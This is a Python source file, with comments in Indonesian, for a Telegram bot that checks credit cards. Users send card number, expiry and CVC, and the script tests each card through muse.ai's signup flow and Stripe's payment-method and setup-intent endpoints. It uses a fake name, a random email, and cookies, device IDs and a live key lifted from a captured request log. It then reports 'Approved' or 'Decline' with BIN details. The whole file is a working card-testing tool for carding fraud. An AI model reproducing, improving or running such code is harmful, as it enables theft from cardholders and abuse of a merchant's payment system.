import asyncio
import httpx
import random
import string
import logging
from faker import Faker

from telegram import Update, constants
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# --- KONFIGURASI ---
# Ganti 'TOKEN_BOT_TELEGRAM_ANDA' dengan token bot Anda yang sebenarnya.
TELEGRAM_BOT_TOKEN = "TOKEN_BOT_TELEGRAM_ANDA"

# Inisialisasi Faker untuk data acak
fake = Faker()

# Konfigurasi logging dasar
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- DATA DARI FILE LOG (HCY) ---
# Kunci publik Stripe untuk muse.ai
STRIPE_KEY = "pk_live_a6DCdatuNGQFYQOaddF0Guf3"

# Cookie yang diekstrak dari request.hcy untuk muse.ai
MUSE_COOKIES = {
    "mode": "light",
    "_ga": "GA1.1.624514859.1750016648",
    "_gcl_au": "1.1.1507302922.1750016648",
    "intercom-id-zu1nwzdd": "939b1207-6933-43fc-941c-f6f197d063fd",
    "intercom-session-zu1nwzdd": "",
    "intercom-device-id-zu1nwzdd": "9bd14dc9-1628-427a-95cf-64c7241079cd",
    "__stripe_mid": "9c2e3b31-8c5f-430d-8345-dbd520b386d5be127e",
    "ab_pricing": "0",
    "ab_landing": "0",
    "__stripe_sid": "5073db46-415c-4e23-835e-accd767e84826b6b8e",
    "_ga_S9Q9QN5EN6": "GS2.1.s1750440172$o14$g1$t1750440223$j9$l0$h0",
}

# Header umum yang digunakan dalam permintaan
BASE_HEADERS = {
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
}

# --- FUNGSI HELPER ---

def get_random_email():
    """Menghasilkan email acak."""
    domain = random.choice(["outlook.com", "gmail.com", "yahoo.com"])
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@{domain}"

async def get_bin_info(bin_number: str):
    """Mendapatkan informasi BIN dari binlist.net."""
    if len(bin_number) < 6:
        return None
    bin_to_check = bin_number[:6]
    url = f"https://lookup.binlist.net/{bin_to_check}"
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, headers={'Accept-Version': '3'})
            if response.status_code == 200:
                return response.json()
            else:
                return None
    except Exception as e:
        logger.error(f"Error getting BIN info: {e}")
        return None

def format_bin_info(bin_data):
    """Memformat informasi BIN menjadi string yang rapi."""
    if not bin_data:
        return (
            "⇻ Brand: Unknown\n"
            "⇻ Type: Unknown\n"
            "⇻ Bank: Unknown\n"
            "⇻ Country: Unknown"
        )
    
    brand = bin_data.get('scheme', 'Unknown').upper()
    card_type = bin_data.get('type', 'Unknown').upper()
    bank = bin_data.get('bank', {}).get('name', 'Unknown').upper()
    country = bin_data.get('country', {}).get('name', 'Unknown').upper()
    country_flag = bin_data.get('country', {}).get('emoji', '')
    
    return (
        f"⇻ Brand: {brand}\n"
        f"⇻ Type: {card_type}\n"
        f"⇻ Bank: {bank}\n"
        f"⇻ Country: {country} {country_flag}"
    )

def get_decline_message(code):
    """Mendapatkan pesan yang lebih ramah dari kode penolakan Stripe."""
    decline_codes = {
        "authentication_required": "Otentikasi 3D Secure diperlukan.",
        "approve_with_id": "Pembayaran disetujui, tetapi verifikasi ID diperlukan.",
        "call_issuer": "Hubungi penerbit kartu untuk informasi lebih lanjut.",
        "card_not_supported": "Kartu tidak mendukung jenis pembelian ini.",
        "card_velocity_exceeded": "Batas saldo/kredit atau jumlah transaksi terlampaui.",
        "do_not_honor": "Penerbit kartu menolak pembayaran tanpa alasan spesifik.",
        "do_not_try_again": "Kartu telah diblokir; jangan coba lagi.",
        "expired_card": "Kartu telah kedaluwarsa.",
        "fraudulent": "Pembayaran dianggap sebagai penipuan.",
        "generic_decline": "Penolakan umum oleh penerbit kartu.",
        "incorrect_number": "Nomor kartu salah.",
        "incorrect_cvc": "CVC salah.",
        "incorrect_pin": "PIN salah.",
        "incorrect_zip": "Kode pos salah.",
        "insufficient_funds": "Dana tidak mencukupi.",
        "invalid_account": "Akun tidak valid atau tidak ada.",
        "invalid_amount": "Jumlah pembayaran tidak valid.",
        "invalid_cvc": "CVC tidak valid.",
        "invalid_expiry_year": "Tahun kedaluwarsa tidak valid.",
        "issuer_not_available": "Penerbit kartu tidak dapat dihubungi.",
        "pickup_card": "Kartu harus disita (kemungkinan dilaporkan hilang/dicuri).",
        "processing_error": "Terjadi kesalahan saat memproses kartu.",
        "reenter_transaction": "Coba lagi transaksi yang sama.",
        "restricted_card": "Kartu dibatasi untuk jenis penggunaan ini.",
        "revocation_of_all_authorizations": "Semua otorisasi dibatalkan.",
        "revocation_of_authorization": "Otorisasi dibatalkan.",
        "security_violation": "Terjadi pelanggaran keamanan.",
        "service_not_allowed": "Layanan tidak diizinkan oleh penerbit kartu.",
        "stolen_card": "Kartu dilaporkan dicuri.",
        "stop_payment_order": "Perintah penghentian pembayaran telah dikeluarkan.",
        "transaction_not_allowed": "Transaksi tidak diizinkan oleh penerbit kartu.",
        "try_again_later": "Coba lagi nanti.",
        "withdrawal_count_limit_exceeded": "Batas penarikan terlampaui."
    }
    return decline_codes.get(code, code.replace("_", " ").capitalize())


# --- FUNGSI UTAMA PENGUJIAN KARTU ---

async def check_card_on_muse(cc, mm, yy, cvc):
    """
    Melakukan alur 4 langkah untuk memeriksa kartu kredit di muse.ai menggunakan Stripe.
    """
    name = fake.name()
    email = get_random_email()
    
    async with httpx.AsyncClient(cookies=MUSE_COOKIES, timeout=30.0) as client:
        try:
            # Langkah 1 & 2 Dihilangkan: `/v1/payment_methods` & `/api/pay/start`
            # Kita langsung ke alur yang lebih modern dari Stripe: membuat SetupIntent,
            # lalu mengonfirmasinya, yang lebih efisien.
            # Langkah A: Buat Setup Intent di muse.ai
            start_payload = {
                "email": email, "name": name, "trial": 1, "tier": "basic",
                "cost_month": 16, "duration": 2629800, "access": "",
                "referral": "", "ab_pricing": 0, "ab_landing": 0
            }
            # Kita tidak mengirim 'pm' pada awalnya, untuk mendapatkan SetupIntent
            start_headers = {**BASE_HEADERS, "origin": "https://muse.ai", "referer": "https://muse.ai/join"}
            
            # Ubah: Kita akan mulai dengan /api/pay/start tanpa 'pm' untuk mendapatkan setup intent baru
            # Namun, berdasarkan log, /pay/start butuh 'pm'. Jadi, kita akan melewati langkah 1 & 2 yang
            # tidak efisien dan langsung ke langkah 3 & 4.
            # Alur yang lebih efisien:
            # A. Dapatkan client secret dari server kita (muse.ai)
            # B. Konfirmasi setup intent di Stripe menggunakan client secret tersebut.
            
            # --- Alur yang Direvisi berdasarkan Log, tetapi disederhanakan jika memungkinkan ---
            # Berdasarkan log, tampaknya alur yang rumit diperlukan. Mari kita replikasi.
            
            # LANGKAH 1 (Mirip File 4): Buat Payment Method di Stripe
            pm_data = {
                'type': 'card',
                'billing_details[name]': name,
                'billing_details[email]': email,
                'card[number]': cc,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'guid': 'bbeb7dc1-2f34-4cba-9e5a-d39fa215300a0b6163', # Static from log
                'muid': '9c2e3b31-8c5f-430d-8345-dbd520b386d5be127e', # Static from log
                'sid': '5073db46-415c-4e23-835e-accd767e84826b6b8e', # Static from log
                'payment_user_agent': 'stripe.js/22a1c02c9a; stripe-js-v3/22a1c02c9a; card-element',
                'time_on_page': str(random.randint(50000, 60000)),
                'key': STRIPE_KEY,
            }
            stripe_headers = {**BASE_HEADERS, "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"}
            pm_resp = await client.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers=stripe_headers)
            
            if pm_resp.status_code != 200:
                return {"status": "error", "message": "Failed to create Stripe Payment Method."}
            pm_id_1 = pm_resp.json().get("id")
            if not pm_id_1:
                 return {"status": "error", "message": "Could not get Payment Method ID from Stripe."}

            # LANGKAH 2 (Mirip File 3): Mulai Pembayaran di Muse.ai
            start_payload["pm"] = pm_id_1
            start_headers = {**BASE_HEADERS, "content-type": "application/json; charset=UTF-8", "origin": "https://muse.ai", "referer": "https://muse.ai/join", "x-requested-with": "XMLHttpRequest"}
            start_resp = await client.post("https://muse.ai/api/pay/start", json=start_payload, headers=start_headers)
            
            if start_resp.status_code != 200:
                return {"status": "error", "message": f"Muse.ai /start API failed with status {start_resp.status_code}."}
            
            start_data = start_resp.json()
            client_secret = start_data.get("secret")
            seti_id = start_data.get("id")

            if not client_secret or not seti_id:
                return {"status": "error", "message": "Could not get client_secret from muse.ai."}

            # LANGKAH 3 (Mirip File 2): Konfirmasi Setup Intent di Stripe (Momen Penentuan)
            confirm_data = {
                'payment_method_data[type]': 'card',
                'payment_method_data[billing_details][name]': name,
                'payment_method_data[billing_details][email]': email,
                'payment_method_data[card][number]': cc,
                'payment_method_data[card][cvc]': cvc,
                'payment_method_data[card][exp_month]': mm,
                'payment_method_data[card][exp_year]': yy,
                'payment_method_data[guid]': 'bbeb7dc1-2f34-4cba-9e5a-d39fa215300a0b6163',
                'payment_method_data[muid]': '9c2e3b31-8c5f-430d-8345-dbd520b386d5be127e',
                'payment_method_data[sid]': '5073db46-415c-4e23-835e-accd767e84826b6b8e',
                'payment_method_data[payment_user_agent]': 'stripe.js/22a1c02c9a; stripe-js-v3/22a1c02c9a; card-element',
                'payment_method_data[time_on_page]': str(random.randint(50000, 60000)),
                'expected_payment_method_type': 'card',
                'use_stripe_sdk': 'true',
                'key': STRIPE_KEY,
                'client_secret': client_secret,
            }
            confirm_resp = await client.post(f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm", data=confirm_data, headers=stripe_headers)
            
            confirm_data = confirm_resp.json()
            
            if confirm_resp.status_code == 200 and confirm_data.get("status") == "succeeded":
                return {"status": "approved", "code": "succeeded", "message": "Your card has been successfully authorized."}
            elif confirm_data.get("status") == "requires_payment_method":
                error = confirm_data.get("last_setup_error", {})
                code = error.get("decline_code") or error.get("code", "unknown_decline")
                return {"status": "declined", "code": code, "message": get_decline_message(code)}
            else:
                error = confirm_data.get("error", {})
                code = error.get("decline_code") or error.get("code", "api_error")
                return {"status": "declined", "code": code, "message": get_decline_message(code)}
                
        except httpx.ReadTimeout:
            return {"status": "error", "message": "Request timed out. Please try again."}
        except Exception as e:
            logger.error(f"An unexpected error occurred: {e}", exc_info=True)
            return {"status": "error", "message": f"An unexpected error occurred: {str(e)}"}


# --- HANDLER PERINTAH TELEGRAM ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kirim pesan saat perintah /start dikeluarkan."""
    user = update.effective_user
    message = (
        f"👋 Welcome, {user.mention_html()}!\n\n"
        "<b>Available Commands:</b>\n\n"
        "<code>/au cc|mm|yy|cvc</code> - Check a credit card.\n\n"
        "<b>Bot by:</b> Secure Auth Team"
    )
    await update.message.reply_html(message)

async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Proses perintah /au untuk memeriksa kartu."""
    user = update.effective_user
    text = update.message.text
    parts = text.split()

    if len(parts) < 2:
        await update.message.reply_text("❌ Format Salah. Gunakan: /au cc|mm|yy|cvc")
        return

    card_info = parts[1]
    try:
        cc, mm, yy, cvc = card_info.split('|')
        if len(yy) == 2:
            yy = "20" + yy
        if len(cc) < 12 or not cc.isdigit() or not mm.isdigit() or not yy.isdigit() or not cvc.isdigit():
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Format Kartu Tidak Valid. Pastikan formatnya benar: cc|mm|yy|cvc")
        return

    # Kirim pesan awal
    checking_msg = await update.message.reply_text("⏳ Checking...")

    # Jalankan pemeriksaan kartu dan dapatkan BIN secara bersamaan
    check_task = asyncio.create_task(check_card_on_muse(cc, mm, yy, cvc))
    bin_task = asyncio.create_task(get_bin_info(cc))
    
    result = await check_task
    bin_data = await bin_task
    
    # Format kartu untuk ditampilkan
    full_cc_info = f"{cc}|{mm}|{yy}|{cvc}"
    
    # Format informasi BIN
    bin_info_str = format_bin_info(bin_data)
    
    # Siapkan pesan hasil
    final_message = "↬ Secure | Auth ↫\n- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"⇻ CC: {full_cc_info}\n"
    
    if result['status'] == 'approved':
        final_message += "⇻ Status: Approved! ✅\n"
        final_message += f"⇻ Result: {result['message']}\n"
        final_message += f"⇻ Code: {result['code']}\n"
    elif result['status'] == 'declined':
        final_message += "⇻ Status: Decline! ❌\n"
        final_message += f"⇻ Result: {result['message']}\n"
        final_message += f"⇻ Code: {result['code']}\n"
    else: # Error case
        final_message += "⇻ Status: Error! ⚠️\n"
        final_message += f"⇻ Result: {result['message']}\n"

    final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"{bin_info_str}\n"
    final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"(↯) Checked by: @{user.username or user.first_name}"

    # Edit pesan awal dengan hasil akhir
    await checking_msg.edit_text(final_message)


def main():
    """Mulai bot."""
    if TELEGRAM_BOT_TOKEN == "TOKEN_BOT_TELEGRAM_ANDA":
        print("!!! KESALAHAN: Harap ganti 'TOKEN_BOT_TELEGRAM_ANDA' dengan token bot Anda yang sebenarnya di dalam file .py.")
        return
        
    # Buat Application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Tambahkan handler untuk perintah
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("au", au_command))

    # Mulai bot
    print("Bot is running...")
    application.run_polling()


if __name__ == "__main__":
    main()
